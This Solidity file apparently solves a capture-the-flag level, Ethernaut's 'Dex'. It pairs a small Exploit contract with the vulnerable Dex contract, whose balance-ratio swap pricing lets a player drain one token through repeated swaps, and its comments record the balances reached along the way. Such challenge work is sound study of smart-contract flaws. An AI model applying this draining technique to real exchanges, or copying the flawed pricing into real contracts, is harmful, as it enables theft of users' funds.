// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0x60bdC327b150d5FdCBFEd30f340D1EBC3146391F
// steal either one of the 2 tokens
// the factory will check if IERC20(token1).balanceOf(_instance) == 0 || ERC20(token2).balanceOf(_instance) == 0;

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Exploit {
  Dex dex;
  constructor(address _dex) {
    dex = Dex(_dex);
  }

  function attack(address from, address to, uint amount) external {
    // at this point I used remix to interact with the contract and swapped a couple of times, by the time I called this function this was the state:
    // Player balances token1:76 token2:0
    // Dex balance token1:34 token2:110
    // amount was computed to be the number that would make getSwapPrice return only the balance of the contract for the to token, in my case token2
    dex.swap(from, to, amount);
  }

  // functions to check things:
  function checkIfenoughToSwap(address token, uint amount) view external returns (bool) {
    return IERC20(token).balanceOf(msg.sender) >= amount;
  }


}

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}